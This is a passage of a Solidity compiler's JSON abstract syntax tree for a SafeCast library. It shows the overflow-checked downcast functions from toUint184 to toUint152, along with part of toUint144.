184"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3952,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"5829:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3955,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5829:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3956,"nodeType":"RevertStatement","src":"5822:49:7"}]}},{"expression":{"arguments":[{"id":3961,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3940,"src":"5906:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3960,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5898:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint184_$","typeString":"type(uint184)"},"typeName":{"id":3959,"name":"uint184","nodeType":"ElementaryTypeName","src":"5898:7:7","typeDescriptions":{}}},"id":3962,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5898:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint184","typeString":"uint184"}},"functionReturnParameters":3944,"id":3963,"nodeType":"Return","src":"5891:21:7"}]},"documentation":{"id":3938,"nodeType":"StructuredDocumentation","src":"5416:280:7","text":" @dev Returns the downcasted uint184 from uint256, reverting on\n overflow (when the input is greater than largest uint184).\n Counterpart to Solidity's `uint184` operator.\n Requirements:\n - input must fit into 184 bits"},"id":3965,"implemented":true,"kind":"function","modifiers":[],"name":"toUint184","nameLocation":"5710:9:7","nodeType":"FunctionDefinition","parameters":{"id":3941,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3940,"mutability":"mutable","name":"value","nameLocation":"5728:5:7","nodeType":"VariableDeclaration","scope":3965,"src":"5720:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3939,"name":"uint256","nodeType":"ElementaryTypeName","src":"5720:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5719:15:7"},"returnParameters":{"id":3944,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3943,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3965,"src":"5758:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint184","typeString":"uint184"},"typeName":{"id":3942,"name":"uint184","nodeType":"ElementaryTypeName","src":"5758:7:7","typeDescriptions":{"typeIdentifier":"t_uint184","typeString":"uint184"}},"visibility":"internal"}],"src":"5757:9:7"},"scope":5451,"src":"5701:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3992,"nodeType":"Block","src":"6276:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3979,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3973,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3968,"src":"6290:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":3976,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6303:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint176_$","typeString":"type(uint176)"},"typeName":{"id":3975,"name":"uint176","nodeType":"ElementaryTypeName","src":"6303:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint176_$","typeString":"type(uint176)"}],"id":3974,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"6298:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":3977,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6298:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint176","typeString":"type(uint176)"}},"id":3978,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"6312:3:7","memberName":"max","nodeType":"MemberAccess","src":"6298:17:7","typeDescriptions":{"typeIdentifier":"t_uint176","typeString":"uint176"}},"src":"6290:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":3986,"nodeType":"IfStatement","src":"6286:105:7","trueBody":{"id":3985,"nodeType":"Block","src":"6317:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313736","id":3981,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6369:3:7","typeDescriptions":{"typeIdentifier":"t_rational_176_by_1","typeString":"int_const 176"},"value":"176"},{"id":3982,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3968,"src":"6374:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_176_by_1","typeString":"int_const 176"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3980,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"6338:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":3983,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6338:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":3984,"nodeType":"RevertStatement","src":"6331:49:7"}]}},{"expression":{"arguments":[{"id":3989,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3968,"src":"6415:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3988,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6407:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint176_$","typeString":"type(uint176)"},"typeName":{"id":3987,"name":"uint176","nodeType":"ElementaryTypeName","src":"6407:7:7","typeDescriptions":{}}},"id":3990,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6407:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint176","typeString":"uint176"}},"functionReturnParameters":3972,"id":3991,"nodeType":"Return","src":"6400:21:7"}]},"documentation":{"id":3966,"nodeType":"StructuredDocumentation","src":"5925:280:7","text":" @dev Returns the downcasted uint176 from uint256, reverting on\n overflow (when the input is greater than largest uint176).\n Counterpart to Solidity's `uint176` operator.\n Requirements:\n - input must fit into 176 bits"},"id":3993,"implemented":true,"kind":"function","modifiers":[],"name":"toUint176","nameLocation":"6219:9:7","nodeType":"FunctionDefinition","parameters":{"id":3969,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3968,"mutability":"mutable","name":"value","nameLocation":"6237:5:7","nodeType":"VariableDeclaration","scope":3993,"src":"6229:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3967,"name":"uint256","nodeType":"ElementaryTypeName","src":"6229:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6228:15:7"},"returnParameters":{"id":3972,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3971,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3993,"src":"6267:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint176","typeString":"uint176"},"typeName":{"id":3970,"name":"uint176","nodeType":"ElementaryTypeName","src":"6267:7:7","typeDescriptions":{"typeIdentifier":"t_uint176","typeString":"uint176"}},"visibility":"internal"}],"src":"6266:9:7"},"scope":5451,"src":"6210:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4020,"nodeType":"Block","src":"6785:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4007,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4001,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3996,"src":"6799:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4004,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6812:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint168_$","typeString":"type(uint168)"},"typeName":{"id":4003,"name":"uint168","nodeType":"ElementaryTypeName","src":"6812:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint168_$","typeString":"type(uint168)"}],"id":4002,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"6807:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4005,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6807:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint168","typeString":"type(uint168)"}},"id":4006,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"6821:3:7","memberName":"max","nodeType":"MemberAccess","src":"6807:17:7","typeDescriptions":{"typeIdentifier":"t_uint168","typeString":"uint168"}},"src":"6799:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4014,"nodeType":"IfStatement","src":"6795:105:7","trueBody":{"id":4013,"nodeType":"Block","src":"6826:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313638","id":4009,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6878:3:7","typeDescriptions":{"typeIdentifier":"t_rational_168_by_1","typeString":"int_const 168"},"value":"168"},{"id":4010,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3996,"src":"6883:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_168_by_1","typeString":"int_const 168"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4008,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"6847:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4011,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6847:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4012,"nodeType":"RevertStatement","src":"6840:49:7"}]}},{"expression":{"arguments":[{"id":4017,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3996,"src":"6924:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4016,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6916:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint168_$","typeString":"type(uint168)"},"typeName":{"id":4015,"name":"uint168","nodeType":"ElementaryTypeName","src":"6916:7:7","typeDescriptions":{}}},"id":4018,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6916:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint168","typeString":"uint168"}},"functionReturnParameters":4000,"id":4019,"nodeType":"Return","src":"6909:21:7"}]},"documentation":{"id":3994,"nodeType":"StructuredDocumentation","src":"6434:280:7","text":" @dev Returns the downcasted uint168 from uint256, reverting on\n overflow (when the input is greater than largest uint168).\n Counterpart to Solidity's `uint168` operator.\n Requirements:\n - input must fit into 168 bits"},"id":4021,"implemented":true,"kind":"function","modifiers":[],"name":"toUint168","nameLocation":"6728:9:7","nodeType":"FunctionDefinition","parameters":{"id":3997,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3996,"mutability":"mutable","name":"value","nameLocation":"6746:5:7","nodeType":"VariableDeclaration","scope":4021,"src":"6738:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3995,"name":"uint256","nodeType":"ElementaryTypeName","src":"6738:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6737:15:7"},"returnParameters":{"id":4000,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3999,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4021,"src":"6776:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint168","typeString":"uint168"},"typeName":{"id":3998,"name":"uint168","nodeType":"ElementaryTypeName","src":"6776:7:7","typeDescriptions":{"typeIdentifier":"t_uint168","typeString":"uint168"}},"visibility":"internal"}],"src":"6775:9:7"},"scope":5451,"src":"6719:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4048,"nodeType":"Block","src":"7294:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4035,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4029,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4024,"src":"7308:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4032,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7321:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint160_$","typeString":"type(uint160)"},"typeName":{"id":4031,"name":"uint160","nodeType":"ElementaryTypeName","src":"7321:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint160_$","typeString":"type(uint160)"}],"id":4030,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"7316:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4033,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7316:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint160","typeString":"type(uint160)"}},"id":4034,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"7330:3:7","memberName":"max","nodeType":"MemberAccess","src":"7316:17:7","typeDescriptions":{"typeIdentifier":"t_uint160","typeString":"uint160"}},"src":"7308:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4042,"nodeType":"IfStatement","src":"7304:105:7","trueBody":{"id":4041,"nodeType":"Block","src":"7335:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313630","id":4037,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7387:3:7","typeDescriptions":{"typeIdentifier":"t_rational_160_by_1","typeString":"int_const 160"},"value":"160"},{"id":4038,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4024,"src":"7392:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_160_by_1","typeString":"int_const 160"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4036,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"7356:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4039,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7356:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4040,"nodeType":"RevertStatement","src":"7349:49:7"}]}},{"expression":{"arguments":[{"id":4045,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4024,"src":"7433:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4044,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7425:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint160_$","typeString":"type(uint160)"},"typeName":{"id":4043,"name":"uint160","nodeType":"ElementaryTypeName","src":"7425:7:7","typeDescriptions":{}}},"id":4046,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7425:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint160","typeString":"uint160"}},"functionReturnParameters":4028,"id":4047,"nodeType":"Return","src":"7418:21:7"}]},"documentation":{"id":4022,"nodeType":"StructuredDocumentation","src":"6943:280:7","text":" @dev Returns the downcasted uint160 from uint256, reverting on\n overflow (when the input is greater than largest uint160).\n Counterpart to Solidity's `uint160` operator.\n Requirements:\n - input must fit into 160 bits"},"id":4049,"implemented":true,"kind":"function","modifiers":[],"name":"toUint160","nameLocation":"7237:9:7","nodeType":"FunctionDefinition","parameters":{"id":4025,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4024,"mutability":"mutable","name":"value","nameLocation":"7255:5:7","nodeType":"VariableDeclaration","scope":4049,"src":"7247:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4023,"name":"uint256","nodeType":"ElementaryTypeName","src":"7247:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7246:15:7"},"returnParameters":{"id":4028,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4027,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4049,"src":"7285:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint160","typeString":"uint160"},"typeName":{"id":4026,"name":"uint160","nodeType":"ElementaryTypeName","src":"7285:7:7","typeDescriptions":{"typeIdentifier":"t_uint160","typeString":"uint160"}},"visibility":"internal"}],"src":"7284:9:7"},"scope":5451,"src":"7228:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4076,"nodeType":"Block","src":"7803:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4063,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4057,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4052,"src":"7817:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4060,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7830:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint152_$","typeString":"type(uint152)"},"typeName":{"id":4059,"name":"uint152","nodeType":"ElementaryTypeName","src":"7830:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint152_$","typeString":"type(uint152)"}],"id":4058,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"7825:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4061,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7825:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint152","typeString":"type(uint152)"}},"id":4062,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"7839:3:7","memberName":"max","nodeType":"MemberAccess","src":"7825:17:7","typeDescriptions":{"typeIdentifier":"t_uint152","typeString":"uint152"}},"src":"7817:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4070,"nodeType":"IfStatement","src":"7813:105:7","trueBody":{"id":4069,"nodeType":"Block","src":"7844:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313532","id":4065,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7896:3:7","typeDescriptions":{"typeIdentifier":"t_rational_152_by_1","typeString":"int_const 152"},"value":"152"},{"id":4066,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4052,"src":"7901:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_152_by_1","typeString":"int_const 152"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4064,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"7865:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4067,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7865:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4068,"nodeType":"RevertStatement","src":"7858:49:7"}]}},{"expression":{"arguments":[{"id":4073,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4052,"src":"7942:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4072,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7934:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint152_$","typeString":"type(uint152)"},"typeName":{"id":4071,"name":"uint152","nodeType":"ElementaryTypeName","src":"7934:7:7","typeDescriptions":{}}},"id":4074,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7934:14:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint152","typeString":"uint152"}},"functionReturnParameters":4056,"id":4075,"nodeType":"Return","src":"7927:21:7"}]},"documentation":{"id":4050,"nodeType":"StructuredDocumentation","src":"7452:280:7","text":" @dev Returns the downcasted uint152 from uint256, reverting on\n overflow (when the input is greater than largest uint152).\n Counterpart to Solidity's `uint152` operator.\n Requirements:\n - input must fit into 152 bits"},"id":4077,"implemented":true,"kind":"function","modifiers":[],"name":"toUint152","nameLocation":"7746:9:7","nodeType":"FunctionDefinition","parameters":{"id":4053,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4052,"mutability":"mutable","name":"value","nameLocation":"7764:5:7","nodeType":"VariableDeclaration","scope":4077,"src":"7756:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4051,"name":"uint256","nodeType":"ElementaryTypeName","src":"7756:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7755:15:7"},"returnParameters":{"id":4056,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4055,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4077,"src":"7794:7:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint152","typeString":"uint152"},"typeName":{"id":4054,"name":"uint152","nodeType":"ElementaryTypeName","src":"7794:7:7","typeDescriptions":{"typeIdentifier":"t_uint152","typeString":"uint152"}},"visibility":"internal"}],"src":"7793:9:7"},"scope":5451,"src":"7737:218:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4104,"nodeType":"Block","src":"8312:152:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4091,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4085,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4080,"src":"8326:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4088,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8339:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint144_$","typeString":"type(uint144)"},"typeName":{"id":4087,"name":"uint144","nodeType":"ElementaryTypeName","src":"8339:7:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint144_$","typeString":"type(uint144)"}],"id":4086,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"8334:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4089,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8334:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint144","typeString":"type(uint144)"}},"id":4090,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"8348:3:7","memberName":"max","nodeType":"MemberAccess","src":"8334:17:7","typeDescriptions":{"typeIdentifier":"t_uint144","typeString":"uint144"}},"src":"8326:25:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4098,"nodeType":"IfStatement","src":"8322:105:7","trueBody":{"id":4097,"nodeType":"Block","src":"8353:74:7","statements":[{"errorCall":{"arguments":[{"hexValue":"313434","id":4093,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8405:3:7","typeDescriptions":{"typeIdentifier":"t_rational_144_by_1","typeString":"int_const 144"},"value":"144"},{"id":4094,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4080,"src":"8410:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_144_by_1","typeString":"int_const 144"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4092,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"8374:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4095,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8374:42:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4096,"nodeType":"RevertStatement","src":"8367:49:7"}]}},{"expression":{"arguments":[{"id":4101,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4080,"src":"8451:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4100,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8443:7:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint144_$","typeString":"type(uint144)"},"typeName":{"id":4099,"name":"uint144","nodeType":"ElementaryTypeName","src":"8443:7:7","typeDescriptions":{}}},"id":4102,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8443:14:7","tryCall":false,"ty